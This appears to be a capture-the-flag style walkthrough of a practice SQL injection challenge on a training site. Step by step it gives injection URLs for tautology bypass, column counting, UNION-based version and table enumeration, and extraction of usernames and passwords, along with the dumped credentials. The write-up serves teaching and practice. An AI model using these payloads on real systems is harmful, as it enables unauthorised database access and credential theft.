<h1>Challenge 1</h1>

**Step 1<br>** 
Challenge Link-<br>
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1``` 

**Step 2<br>**
Find out all users-<br>
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+OR+'1'='1``` 

**Step 3<br>**
Use ORDER BY clause to find out the number of columns in the current table-<br>
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+ORDER+BY+3--+ ```

**Step 4<br>**
Now that we know how many columns the current table has, we will use UNION to see which column is vulnerable. UNION SELECT is used to combine results from multiple SELECT statements into a single result. The vulnerable column is the one whose data is being displayed on the page-<br> 
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+UNION+SELECT+1,2,3--+``` 

The number 2 is printed, hence, it is the vulnerable column.<br> 

**Step 5<br>** 
Show MySQL version-<br>
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+UNION+SELECT+1,version(),3--+```<br>
Result-<br>  
```5.6.44-cll-lve``` 

**Step 6<br>**
Find out the table names-<br> 
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+UNION+SELECT+1,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),3--+```<br>
```Result- testtable1,userlogs,users```<br>
group_concat - Concatenate results into a string <br>
Information_schema - Database that stores information about other databases <br>
 
**Step 7<br>**
Find the password for users- 
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+UNION+SELECT+1,(SELECT+password+FROM+users+WHERE+ID=1),3--+ ```<br>
```Result-``` <br>
```Username is : injector```<br> 
```Username is : khan``` <br>

**Step 8<br>**
Username and password for all users-<br> 
```http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'+UNION+SELECT+1,(SELECT+group_concat(username,0x0a,password)+FROM+users+WHERE+ID=1+OR+1=1),3--+ ``` <br>
<br>Format- [username password] <br>
```Result-```<br>
```Username is : injector khan,decompiler hacktract,devilhunte dante,Zen sec-idiots,Zenodermus security-i,grayhat hacker,khan haxor,admin sadmin``` 
